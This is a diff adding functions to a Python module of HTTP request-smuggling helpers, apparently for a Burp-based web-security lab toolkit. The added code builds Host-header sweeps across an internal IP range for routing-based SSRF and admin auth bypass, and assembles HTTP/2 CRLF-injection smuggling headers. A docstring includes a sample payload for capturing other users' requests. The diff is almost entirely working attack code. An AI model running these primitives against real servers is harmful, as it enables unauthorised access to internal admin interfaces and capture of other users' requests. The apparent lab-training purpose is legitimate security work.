@@ -18,6 +18,17 @@ practice, done by hand:
 These helpers compute both from data instead of a blind Content-Length search.
 Pure functions — no Burp round-trip; feed the result to send_raw_request with
 http_version="direct".
+
+This module also holds sibling desync/host-header primitives surfaced by the
+same lab family:
+  - wrap_clte / wrap_tecl  — the two byte-exact HTTP/1 smuggle wrappers.
+  - build_host_sweep       — Host-header sweep raws (routing-based SSRF /
+    host-header auth bypass) for send_raw_request, which preserves a divergent
+    Host where curl_request / concurrent_requests drop it (Montoya re-derives
+    Host from the connection service).
+  - build_h2_crlf_smuggle  — HTTP/2-request-smuggling-via-CRLF-injection
+    components for a raw h2 client (send_raw_request cannot inject a CRLF into
+    an h2 header value).
 """
 
 CRLF = "\r\n"
@@ -120,3 +131,61 @@ def capture_cl_through(sample_request: str, prefix_len: int,
     depth = len(sample_request[:end].encode())
     return {"content_length": prefix_len + depth,
             "capture_depth": depth, "found": True}
+
+
+def build_host_sweep(target_host: str, path: str = "/admin",
+                     base: str = "192.168.0", start: int = 1, end: int = 255,
+                     extra_headers: dict | None = None) -> list[tuple[str, str]]:
+    """Build send_raw_request raw strings for a Host-header sweep over an IP range.
+
+    Routing-based SSRF and Host-header auth-bypass need the Host header to DIVERGE
+    from the connection target. Montoya re-serialises the Host from the connection
+    service on the curl_request / concurrent_requests path, so a divergent Host is
+    silently dropped there; send_raw_request goes over a direct HTTP/1 socket and
+    preserves it. This returns [(ip, raw), ...] to feed one at a time (or in
+    parallel batches) to send_raw_request(host=target_host, http_version="1").
+    A dead internal IP returns 504 (gateway timeout); the admin returns 200 — the
+    one non-504/non-403 in the sweep.
+
+    Args:
+        target_host: The lab host to actually connect to (send_raw_request `host`).
+        path: Path to request on the internal target (default /admin).
+        base: /24 network prefix (default 192.168.0).
+        start, end: inclusive last-octet range to sweep (default 1..255).
+        extra_headers: optional headers added to every request.
+    """
+    hdr = "".join(f"{CRLF}{k}: {v}" for k, v in (extra_headers or {}).items())
+    out: list[tuple[str, str]] = []
+    for n in range(start, end + 1):
+        ip = f"{base}.{n}"
+        raw = (f"GET {path} HTTP/1.1{CRLF}Host: {ip}{hdr}"
+               f"{CRLF}Connection: close{CRLF}{CRLF}")
+        out.append((ip, raw))
+    return out
+
+
+def build_h2_crlf_smuggle(host: str, smuggled_request: str, carrier: str = "foo",
+                          inject: str = "transfer-encoding: chunked",
+                          method: str = "POST", path: str = "/") -> dict:
+    """Build the components for HTTP/2 request smuggling via CRLF injection.
+
+    send_raw_request cannot express this attack: it needs a header whose VALUE
+    contains a literal CRLF so a smuggled header (e.g. Transfer-Encoding: chunked)
+    survives the front-end's HTTP/2->HTTP/1 downgrade as its own header line — a
+    normal TE header is stripped before downgrade. Returns an h2 header list (with
+    the CRLF-injected carrier header) plus the DATA body, for a raw h2 client
+    configured with validate_outbound_headers=False / normalize_outbound_headers=
+    False (Burp's HTTP/2 tab does this natively). For H2.TE capture, `smuggled_request`
+    is the chunk terminator + smuggled request, e.g.
+    "0\\r\\n\\r\\nPOST / HTTP/1.1\\r\\nHost: h\\r\\nContent-Length: 700\\r\\n\\r\\nsearch=".
+
+    Returns dict: {headers: [(name,value)...], body: str, carrier_value: str}.
+    """
+    carrier_value = f"bar{CRLF}{inject}"
+    headers = [
+        (":method", method), (":path", path), (":scheme", "https"),
+        (":authority", host),
+        (carrier, carrier_value),
+        ("content-type", "application/x-www-form-urlencoded"),
+    ]
+    return {"headers": headers, "body": smuggled_request, "carrier_value": carrier_value}
